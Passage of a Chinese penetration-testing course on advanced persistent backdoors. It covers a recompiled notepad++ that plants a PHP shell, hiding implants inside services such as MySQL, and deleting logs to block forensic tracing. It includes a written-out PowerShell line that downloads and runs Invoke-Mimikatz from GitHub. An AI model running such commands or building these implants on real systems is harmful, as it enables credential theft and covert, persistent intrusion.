-373-
本文档使用书栈(BookStack.CN)构建
php.ini配置
第五十七课：高级持续渗透-第一季关于后门
-374-
本文档使用书栈(BookStack.CN)构建
以Demo.php为例，demo.php代码如下：
在访问demo.php，post带有触发后门特征，来执行攻击者的任意php代码。在demo中，仅仅是做到
了，无明显的以php后缀为结尾的后门，那么结合第一条，有目标源码为前提，来写入其他默认自带扩
展中，来达到更隐蔽的作用。
第五十七课：高级持续渗透-第一季关于后门
-375-
本文档使用书栈(BookStack.CN)构建
优点：在对抗反病毒，反后门软件中有绝对优势，可本地多次调试，稳定性非常强壮。跨平台能力非常
强壮，且可以对后门选择方式任意，如主动后门，被动后门，人为化后门等。
缺点：在编译后门的时候，需要查阅大量API，一个平台到多个平台的相关API。调试头弄，失眠，吃
不下去饭。领导不理解，冷暖自知。
第二季从防御者角度来对抗。
后者的话：
目前国内市场的全流量日志分析，由于受制于存储条件等因素，大部分为全流量，流量部分分析。那么在高级持
久性后门中，如何建立一个伪流量非实用数据来逃逸日志分析，这应该是一个优秀高级持续后门应该思考的问
题。
Micropoor
第五十七课：高级持续渗透-第一季关于后门
-376-
本文档使用书栈(BookStack.CN)构建
这次继续围绕第一篇，第一季关于后门：
https://micropoor.blogspot.hk/2017/12/php.html
做整理与补充。在深入一步细化demonotepad++。
后门是渗透测试的分水岭，它分别体现了攻击者对目标机器的熟知程度，环境，编程语言，了解对方客
户，以及安全公司的本质概念。这样的后门才能更隐蔽，更长久。
而对于防御者需要掌握后门的基本查杀，与高难度查杀，了解被入侵环境，目标机器。以及后门或者病
毒可隐藏角落，或样本取证，内存取证。
所以说后门的安装与反安装是一场考试，一场实战考试。
这里要引用几个概念，只有概念清晰，才能把后门加入概念化，使其更隐蔽。
1：攻击方与防御方的本质是什么？
增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。
2：安全公司的本质是什么？
盈利，最小投入，最大产出。
3：安全公司产品的本质是什么？
能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的
客户）
4：安全人员的本质是什么？
赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。
5：对接客户的本质是什么？
对接客户也是某公司内安全工作的一员，与概念4相同。
清晰了以上5个概念，作为攻击者，要首先考虑到对抗成本，什么样的对抗成本，能满足概念1-5。影响
或阻碍对手方的核心利益。把概念加入到后门，更隐蔽，更长久。
文章的标题既然为php安全新闻早八点，那么文章的本质只做技术研究，Demo本身不具备攻击或者持续
控制权限功能。
Demo环境：windows7x64，notepad++(x64)
DemoIDE：vs2017
在源码中，我们依然修改每次打开以php结尾的文件，先触发后门，在打开文件。其他文件跳过触发后
门。但是这次代码中加入了生成micropoor.txt功能。并且使用php来加载运行它，是的，生成一个
txt。demo中，为了更好的演示，取消自动php加载运行该txt。
Demo连载第二季：
第五十八课：高级持续渗透-第二季关于后门补充一
-377-
本文档使用书栈(BookStack.CN)构建
而txt的内容如图所示，并且为了更好的了解，开启文件监控。
使用notepad++(demo2).exe打开以php结尾的demo.php，来触发microdoor。并且生成了
micropoor.txt
第五十八课：高级持续渗透-第二季关于后门补充一
-378-
本文档使用书栈(BookStack.CN)构建
第五十八课：高级持续渗透-第二季关于后门补充一
-379-
本文档使用书栈(BookStack.CN)构建
而micropoor.txt内容：
第五十八课：高级持续渗透-第二季关于后门补充一
-380-
本文档使用书栈(BookStack.CN)构建
配合micropoor.txt的内容，这次的Demo将会变得更有趣。
那么这次demo做到了，无服务，无进程，无端口，无自启。
根据上面的5条概念，加入到了demo中，增加对手成本。使其更隐蔽。
如果demo不是notepad++，而是mysql呢?用它的端口，它的进程，它的服务，它的一切，来重新编译
microdoor。
例如：重新编译mysql.so,mysql.dll，替换目标主机。
无文件，无进程，无端口，无服务，无语言码。因为一切附属于它。
这应该是一个攻击者值得思考的问题。
正如第一季所说：在后门的进化中，rootkit也发生了变化，最大的改变是它的系统层次结构发生了变
化。
Micropoor
第五十八课：高级持续渗透-第二季关于后门补充一
-381-
本文档使用书栈(BookStack.CN)构建
前者的话：从第三季开始引入段子，让本枯燥的学术文章，也变得生动有趣。
第二季的Demo遵循人性五条来设计，回忆这其中五条：
1：攻击方与防御方的本质是什么？
增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。
2：安全公司的本质是什么？
盈利，最小投入，最大产出。
3：安全公司产品的本质是什么？
能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张，宽带不足等问题的
客户）
4：安全人员的本质是什么？
赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。
5：对接客户的本质是什么？
对接客户也是某公司内安全工作的一员，与概念4相同。
6:线索排查与反线索排查
那么这个demo离可高级可持续性渗透后门还有一段距离，这里引入第六条“线索排查”与“反线索排
查”，在第二季的demo中，它生成了一个名为micropoor.txt的文件，如果经验丰富的安全人员可根
据时间差来排查日记，demo的工作流程大致是这样的，打开notepad++，生成micropoor.txt，写
入内容，关闭文件流。根据线索排查，定位到notepad++，导致权限失控。
在线索排查概念中，这里要引入“ABC”类线索关联排查，当防御者在得到线索A，顺藤到B，最后排查到
目标文件C，根据五条中的第一条，demo要考虑如何删除指定日志内容，以及其他操作。来阻止ABC类
线索关联排查。
不要思维固死在这是一个nontepad++后门的文章，它是一个面向类后门，面向的是可掌握源码编译的
类后门。同样不要把思维固定死在demo中的例子，针对不同版本的NT系统，完全引用“powershell
IEX(New-Object
System.Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/cly
mb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1');Invoke-
Mimikatz”而关于bypass
UAC，已经有成熟的源码。或发送至远程或是写在本地的图片里，不要让知识，限制了后门的想象。这
也正是第一季所说的：一个优秀的Microdoor是量身目标制定且一般不具备通用性的。是的，一般不具
备通用性。
观看目前文章的一共有2类人，一类攻击方，一类防守方。假设一个场景，现在摆在你面前有一台笔记
本，并且这台笔记本有明确的后门，你的任务，排查后门。我想所有人都会排查注册表，服务，端口，
进程等。因为这些具备通用性，也同样具备通用性排查手段。
第五十九课：高级持续渗透-第三季关于后门补充二
-382-
本文档使用书栈(BookStack.CN)构建
临近文章结尾，第三次引用：在后门的进化对抗中，rootkit也发生了变化，最大的改变是它的系统层
次结构发生了变化。如果彻底理解了这段话。那么就要引用王健X爸爸的一句话：先定个小目标，控它
个1825天。
/
段子/
奈何厂商不重视后渗透攻击与持久性攻击，文章的结尾引用马X爸爸的一句话：厂商不改变，我们就改
变厂商。
Micropoor
第五十九课：高级持续渗透-第三季关于后门补充二
-383-
本文档使用书栈(BookStack.CN)构建
第四季是一个过渡季，过渡后门在对抗升级中由传统后门，衍生成锁定目标的制定后门。引用百度百科
的“后门程序”的相关解释：
https://baike.baidu.com/item/%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/108154
安全从业人员，其实至少一直在与传统后门对抗，比如最常见的webshell免杀与webshell过waf。应
急中的样本取证查杀远控残留文件等。但是webshell，远控仅仅又是“backdoor”的其中一种。
这里按照上几季的风格继续引用几个概念，只有概念清晰，才能了解如何对抗。
1：安全从业人员为什么要了解后门？
防御是以市场为核心的，而不是以项目为核心。需要对抗的可能是黑产从业者的流量劫持相关
后门，或者是政治黑客的高持续渗透权限把控后门等。
2：攻击人员为什么要了解后门？
随着对抗传统后门的产品越来越成熟，由特征查杀，到行为查杀，到态势感知。到大数据联合特征溯源
锁定，如何反追踪，是一个非常值得思考的问题。
3：后门与项目的关联是什么？
某项目，被入侵，应急并加固解决，若干天后，再次被入侵依然篡改为某博彩。导致安全从业人员，客
户之间的问题。
4：后门与安全产品的关联是什么？
某客户购买某安全产品套装，在实战中，一般由非重点关注服务器迂回渗透到核心服务器来跨过安全产
品监控，得到相关权限后，后门起到越过安全产品。它会涉及对其他附属安全产品的影响。如客户质
疑：为什么我都买了你们的套装，还被入侵。并且这还是第二次了。
思维跳出以上4条，来看下进一年的部分相关安全事件：
第六十课：高级持续渗透-第四季关于后门
-384-
本文档使用书栈(BookStack.CN)构建
思维跳出以上4条安全事件，这里再一次引入百度百科的APT的主要特性：
——潜伏性：这些新型的攻击和威胁可能在用户环境中存在一年以上或更久，他们不断收集各种信息，直
到收集到重要情报。而这些发动APT攻击的黑客目的往往不是为了在短时间内获利，而是把“被控主
机”当成跳板，持续搜索，直到能彻底掌握所针对的目标人、事、物，所以这种APT攻击模式,实质上是
一种“恶意商业间谍威胁”。
——持续性：由于APT攻击具有持续性甚至长达数年的特征，这让企业的管理人员无从察觉。在此期间，
这种“持续性”体现在攻击者不断尝试的各种攻击手段，以及渗透到网络内部后长期蛰伏。
——锁定特定目标：针对特定政府或企业，长期进行有计划性、组织性的窃取情报行为,针对被锁定对象
寄送几可乱真的社交工程恶意邮件，如冒充客户的来信,取得在计算机植入恶意软件的第一个机会。
——安装远程控制工具：攻击者建立一个类似僵尸网络Botnet的远程控制架构，攻击者会定期传送有潜
在价值文件的副本给命令和控制服务器(C&CServer)审查。将过滤后的敏感机密数据，利用加密的方
式外传。
一次针对特定对象，长期、有计划性渗透的本质是什么？窃取数据下载到本地，或者以此次渗透来达到
变现目的。引用如图：
第六十课：高级持续渗透-第四季关于后门
-385-
本文档使用书栈(BookStack.CN)构建
第六十课：高级持续渗透-第四季关于后门
-386-
本文档使用书栈(BookStack.CN)构建
一次具有针对性的渗透，绝对不单单是以渗透DMZ区为主，重要资料一般在内网服务器区（包括但不限
制于数据库服务器，文件服务器，OA服务器），与内网办公区（包括但不限制于个人机，开发机，财务
区）等。而往往这样的高级持续渗透，不能是一气呵成，需要一定时间内，来渗透到资料所在区域。而
这里其中一个重要的环节就是对后门的要求，在渗透期间内（包括但不限制于一周到月甚至到年）以保
持后续渗透。
传统型的后门不在满足攻击者的需求，而传统型的木马后门，大致可分为六代：
第一代，是最原始的木马程序。主要是简单的密码窃取，通过电子邮件发送信息等，具备了木马最基本
的功能。
第二代，在技术上有了很大的进步，冰河是中国木马的典型代表之一。
第三代，主要改进在数据传递技术方面，出现了ICMP等类型的木马，利用畸形报文传递数据，增加了杀
毒软件查杀识别的难度。
第四代，在进程隐藏方面有了很大改动，采用了内核插入式的嵌入方式，利用远程插入线程技术，嵌入
DLL线程。或者挂接PSAPI，实现木马程序的隐藏，甚至在WindowsNT/2000下，都达到了良好的隐
藏效果。灰鸽子和蜜蜂大盗是比较出名的DLL木马。
第五代，驱动级木马。驱动级木马多数都使用了大量的Rootkit技术来达到在深度隐藏的效果，并深入
到内核空间的，感染后针对杀毒软件和网络防火墙进行攻击，可将系统SSDT初始化，导致杀毒防火墙失
去效应。有的驱动级木马可驻留BIOS，并且很难查杀。
第六代，随着身份认证UsbKey和杀毒软件主动防御的兴起，黏虫技术类型和特殊反显技术类型木马逐
第六十课：高级持续渗透-第四季关于后门
-387-
本文档使用书栈(BookStack.CN)构建
渐开始系统化。前者主要以盗取和篡改用户敏感信息为主，后者以动态口令和硬证书攻击为主。
PassCopy和暗黑蜘蛛侠是这类木马的代表。
以远控举例，远控最开始生成的RAT功能一体化（包括但不限制于文件传输，命令执行等），后衍生成
生成RAT支持插件式来达到最终目的。
以上的几代包括以上远控共同点，以独立服务或者独立进程，独立端口等来到达目的。难以对抗目前的
反病毒反后门程序。那么传统型后门权限维持就不能满足目前的需求。
以第二季的demo举例，它无自己的进程，端口，服务，而是借助notepad++（非dll劫持）来生成php
内存shell（这个过程相当于插件生成），并且无自启，当服务器重启后，继续等待管理员使用
notepad++，它属于一个AB链后门，由A-notepad生成B-shell，以B-shell去完成其他工作。如果
继续改进Demo，改造ABC链后门，A负责生成，B负责清理痕迹，C负责工作呢?这是一个攻击者应该思
考的问题。
而后门的主要工作有2点，1越过安全产品。2维持持续渗透权限。
文章的结尾，这不是一个notepad++的后门介绍，它是一个demo，一个类后门，一个具有源码可控类
的后门。
Micropoor
第六十课：高级持续渗透-第四季关于后门
-388-
本文档使用书栈(BookStack.CN)构建
这一季依然是一个过渡季，根据之前的连载中，了解到后门是渗透测试的分水岭，它分别体现了攻击者
对目标机器的熟知程度，环境，编程语言，了解对方客户，以及安全公司的本质概念。也同样检测了防
御者需要掌握后门的基本查杀，与高难度查杀，了解被入侵环境，目标机器。以及后门或者病毒可隐藏
角落，或样本取证，内存取证等。对各种平台查杀熟知，对常见第三方软件的了解程度。既然题目
以“艺术”为核心，那么怎样把后门“艺术”行为化呢？
依然遵循以往，引入概念，只有概念清晰，本质清晰，对于攻击者，这样的后门更具有持久性，潜伏
性，锁定性等。对于防御者，更能熟知反后门对抗，对待常用第三方软件的检测方式方法，切断攻击者
的后渗透攻击。溯源或取证攻击者。
在高级持续渗透测试中，PTES的渗透测试执行标准主要分为6段1报。既：
1.前期交互阶段
2.情报收集阶段
3.威胁建模阶段
4.漏洞分析阶段
5.渗透攻击阶段
6.后渗透攻击阶段
7.报告编写
这里要讲的不是打破它的流程，而是归纳总结到类，明确了类的方向，对待一个未知的目标网络环境，
更能清晰的进行攻击或者对抗。
提权的本质是什么？
信息搜集，搜集目标补丁情况，了解目标第三方利用等。
内网渗透的本质是什么？
信息搜集，搜集目标内网的组织架构，明确渗透诉求，在渗透过程中，当获取到内网组织架构图，如鱼
得水。
渗透与高级持续渗透的本质区别是什么？
区别于“持续”，可长期根据攻击者的诉求来潜伏持久的，具有针对性的信息获取。
（而在高级持续渗透它又分为2类，一类持久渗透，一类即时目标渗透）
溯源取证与对抗溯源取证的本质是什么？
信息搜集与对抗信息搜集。
以上4条，清晰的明确了类，以及类方向，在一次完整的实战过程中，攻击者与防御者是需要角色对换